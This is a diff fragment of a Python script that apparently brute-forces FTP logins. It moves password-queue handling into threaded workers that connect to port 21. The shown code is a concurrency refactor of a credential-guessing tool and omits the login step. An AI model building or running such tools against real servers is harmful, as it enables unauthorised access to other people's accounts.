@@ -39,12 +39,7 @@ for pwd in passwords:
     pass_queue.put(pwd)
 
 
-while not event_done.is_set() and not pass_queue.empty():
-    try:
-        password = pass_queue.get_nowait()
-    except queue.Empty:
-        break
-    ...
+
 
 
 
@@ -56,11 +51,12 @@ truepasswd = None
 
 def workers():
     global trueuser, truepasswd
-    while not event_done.is_set():
+    while not event_done.is_set() and not pass_queue.empty():
         try:
-            password = next(passwords_iter)
-        except StopIteration:
+            password = pass_queue.get_nowait()
+        except queue.Empty:
             break
+
         try:
             with ftplib.FTP() as serve:
                 serve.connect(host,21,timeout=5)
